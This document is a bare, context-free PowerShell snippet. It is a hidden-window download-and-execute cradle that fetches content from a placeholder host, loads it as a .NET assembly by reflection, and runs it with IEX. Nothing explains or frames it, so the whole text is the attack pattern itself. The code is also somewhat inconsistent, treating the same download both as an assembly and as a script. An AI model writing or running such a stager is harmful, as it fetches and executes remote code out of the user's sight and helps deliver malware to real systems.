powershell -NoProfile -WindowStyle Hidden
$c = Invoke-WebRequest -Uri 'http://example.invalid/b' -UseBasicParsing
$asm = [Reflection.Assembly]::Load($c.Content)
IEX $c.Content
